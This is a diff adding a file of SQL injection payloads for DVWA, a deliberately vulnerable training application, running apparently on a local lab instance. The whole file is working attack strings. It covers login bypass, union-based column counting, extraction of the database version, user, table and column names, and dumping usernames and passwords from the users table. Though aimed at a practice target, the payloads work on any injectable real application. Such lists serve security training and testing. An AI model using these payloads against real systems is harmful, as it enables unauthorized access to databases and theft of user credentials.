@@ -1,0 +1,37 @@
+# SQL Injection Payloads for DVWA
+# URL: http://localhost:8081/vulnerabilities/sqli/
+
+# Basic Authentication Bypass
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+admin'--
+' OR 1=1--
+" OR 1=1--
+
+# Union Based - Find column count
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+
+# Extract database info
+' UNION SELECT null,version()--
+' UNION SELECT null,database()--
+' UNION SELECT null,user()--
+
+# Extract table names
+' UNION SELECT null,table_name FROM information_schema.tables WHERE table_schema=database()--
+
+# Extract column names
+' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users'--
+
+# Extract usernames and passwords
+' UNION SELECT user,password FROM users--
+' UNION SELECT null,concat(user,':',password) FROM users--
+
+# DVWA Specific - User ID field
+1' OR '1'='1
+1' UNION SELECT user,password FROM users#
+1' UNION SELECT null,concat(first_name,':',last_name,':',user,':',password) FROM users#
